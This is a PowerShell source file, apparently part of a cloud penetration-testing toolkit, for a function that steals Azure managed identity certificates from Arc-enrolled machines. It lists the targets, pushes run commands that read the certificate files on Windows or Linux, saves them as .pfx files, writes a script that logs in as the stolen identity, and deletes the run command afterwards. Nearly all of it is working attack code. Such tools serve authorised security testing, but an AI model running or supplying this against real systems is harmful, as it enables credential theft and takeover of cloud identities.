<#
    File: Get-AzArcCertificates.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2024
    Description: PowerShell function for dumping Azure Managed Identity Certificates from Arc enrolled systems.
#>


Function Get-AzArcCertificates
{
<#

    .SYNOPSIS
        Dumps access tokens for any Azure Arc systems with attached Managed Identities.
    .DESCRIPTION
        This function will look for any available Arc enrolled systems, allow you to select systems to target, then use the Run Command extension to run commands on the system to extract the Managed Identity certificate.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER Name
        Arc system to attack.
    .PARAMETER All
        Flag to allow default targeting of all systems
    .EXAMPLE
        PS C:\MicroBurst> Get-AzArcCertificates -Verbose 
        VERBOSE: Logged In as kfosaaen@example.com
        VERBOSE: Enumerating Azure Arc Resources in the "Sample Subscription" Subscription
        VERBOSE: 	1 Azure Arc Resource(s) enumerated in the "Sample Subscription" Subscription
        VERBOSE: 		Starting extraction on the i-001aab1bcba8519b1 system
        VERBOSE: 			The i-001aab1bcba8519b1 system is registered as a Windows system
        VERBOSE: 			Adding the SLTImRxhgyukwjE command to the i-001aab1bcba8519b1 system
        VERBOSE: 				Sleeping 10 seconds to allow the command to execute
        VERBOSE: 			Getting the command results from the i-001aab1bcba8519b1 system
        VERBOSE: 				Sleeping additional 5 seconds to allow the command to execute
        VERBOSE: 				Sleeping additional 5 seconds to allow the command to execute
        VERBOSE: 			Writing the certificate to C:\MicroBurst\6843069d-5b5b-4618-86ac-0ccc8d6a6476.pfx
        VERBOSE: 				Run .\AuthenticateAs-6843069d-5b5b-4618-86ac-0ccc8d6a6476.ps1 (as a local admin) to import the cert and login as the Managed Identity for the i-001aab1bcba8519b1 system
        VERBOSE: 			Removing the SLTImRxhgyukwjE command from the i-001aab1bcba8519b1 system
        VERBOSE: Azure Arc certificate extraction completed for the "Sample Subscription" Subscription

    .LINK
    https://www.netspi.com/blog/technical-blog/cloud-pentesting/extracting-managed-identity-certificates-from-the-azure-arc-service/
#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",

        [parameter(Mandatory=$false,
        HelpMessage="The Arc system to attack.")]
        [String]$Name = "",

        [parameter(Mandatory=$false,
        HelpMessage="Flag for attacking all Arc systems.")]
        [switch]$All = $false

    )

    if(($All) -and ("" -ne $Name)){Write-Output "Name parameter and All parameter are both in use. Choose one or the other, but not both"; break}

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
    

    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | Out-GridView -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {
            if ($All){Get-AzArcCertificates -Subscription $sub -All}
            else{Get-AzArcCertificates -Subscription $sub -Name $Name}
        }
        return
    }

    Write-Verbose "Logged In as $accountName"

    Write-Verbose "Enumerating Azure Arc Resources in the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" Subscription"
    
    # Get all resources that match hybrid compute
    $ArcList = Get-AzResource -ResourceType Microsoft.HybridCompute/machines 
    
    Write-Verbose "`t$($ArcList.Count) Azure Arc Resource(s) enumerated in the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" Subscription"

    # Check for single Arc Server parameter
    if ("" -ne $Name){
        $arcChoice = $ArcList| where Name -EQ $Name
    }
    elseif($all -eq $true){$arcChoice = $ArcList}
    else{
        # Prompt user for which machine(s) to target
        $arcChoice = $ArcList| out-gridview -Title "Select One or More Arc systems to attack..." -PassThru
    }

    foreach ($arc in $arcChoice) {
    
        try{
            # For each resource, create a new run command, run it, get the output, and delete the command
            Write-Verbose "`t`tStarting extraction on the $($arc.Name) system"

            # Request management API for additional info
            $arcData = (Invoke-AzRestMethod -Path "$($arc.ResourceId)/?api-version=2019-03-18-preview" -Method GET).Content | ConvertFrom-Json
        
            # OS Command Objects
            if($arcData.properties.osName -eq "windows"){$scriptContent = "gc C:\ProgramData\AzureConnectedMachineAgent\Certs\myCert.cer"; Write-Verbose "`t`t`tThe $($arc.Name) system is registered as a Windows system"}
            else{$scriptContent = "cat /var/opt/azcmagent/certs/myCert"; Write-Verbose "`t`t`tThe $($arc.Name) system is registered as a Linux system"}

            # Modified from - https://medium.com/@pratheep.sinnathurai/run-command-on-azure-arc-enabled-servers-5e76ff126969
            $commandName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

            # Set up body of the PUT request
            $body = @{
                location = $($arc.Location)
                properties = @{
                source = @{
                    script = $scriptContent
                    }
                    parameters = @()
                }
            } | ConvertTo-Json -Depth 3

            # Add the command
            Write-Verbose "`t`t`tAdding the $commandName command to the $($arc.Name) system"
            Invoke-AzRestMethod -Path "$($arc.ResourceId)/runCommands/$($commandName)?api-version=2023-10-03-preview" -Method PUT -Payload $body | Out-Null
            Write-Verbose "`t`t`t`tSleeping 10 seconds to allow the command to execute"
            sleep -Seconds 10
        
            # Try to get the results
            Write-Verbose "`t`t`tGetting the command results from the $($arc.Name) system"
            $cmdResult = (Invoke-AzRestMethod -Path "$($arc.ResourceId)/runCommands/$($commandName)?api-version=2023-10-03-preview" -Method GET).Content | ConvertFrom-Json
        
            # Loop until command results are ready
            while($cmdResult.properties.provisioningState -eq "Creating"){
                Write-Verbose "`t`t`t`tSleeping additional 5 seconds to allow the command to execute"
                sleep 5
                $cmdResult = (Invoke-AzRestMethod -Path "$($arc.ResourceId)/runCommands/$($commandName)?api-version=2023-10-03-preview" -Method GET).Content | ConvertFrom-Json
            }
        
            # If it failed, alert, else dump the cert and write the "Auth As" script
            if($cmdResult.properties.provisioningState -eq "Failed"){Write-Output "`t`t`tExecution of $commandName command on the $($arc.Name) system failed"}
            else{
                Write-Verbose "`t`t`tWriting the certificate to $PWD\$($arcData.identity.principalId).pfx"
                [IO.File]::WriteAllBytes("$PWD\$($arcData.identity.principalId).pfx",[Convert]::FromBase64String($($cmdResult.properties.instanceView.output)))

                $miAppID = ((Get-PfxCertificate $("$PWD\$($arcData.identity.principalId).pfx")).Subject).Split('=')[1]

                # Write the AuthenticateAs script
                "`$thumbprint = '$((Get-PfxCertificate "$PWD\$($arcData.identity.principalId).pfx").Thumbprint)'"| Out-File -FilePath "$pwd\AuthenticateAs-$($arcData.identity.principalId).ps1"
                "`$tenantID = '$($arcData.identity.tenantId)'" | Out-File -FilePath "$pwd\AuthenticateAs-$($arcData.identity.principalId).ps1" -Append                                               
                "`$appId = '$miAppID'" | Out-File -FilePath "$pwd\AuthenticateAs-$($arcData.identity.principalId).ps1" -Append
                "Import-PfxCertificate -FilePath .\$($arcData.identity.principalId).pfx -CertStoreLocation Cert:\LocalMachine\My" | Out-File -FilePath "$pwd\AuthenticateAs-$($arcData.identity.principalId).ps1" -Append
                "Connect-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -FilePath "$pwd\AuthenticateAs-$($arcData.identity.principalId).ps1" -Append
            
                Write-Verbose "`t`t`t`tRun .\AuthenticateAs-$($arcData.identity.principalId).ps1 (as a local admin) to import the cert and login as the Managed Identity for the $($arc.Name) system"

            }

            # Delete the command
            Write-Verbose "`t`t`tRemoving the $commandName command from the $($arc.Name) system"
            Invoke-AzRestMethod -Path "$($arc.ResourceId)/runCommands/$($commandName)?api-version=2023-10-03-preview" -Method DELETE | Out-Null

        }
        catch{Write-Verbose "`t`tExtraction failed on the $($arc.Name) system"}
    }
    Write-Verbose "Azure Arc certificate extraction completed for the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" Subscription"
}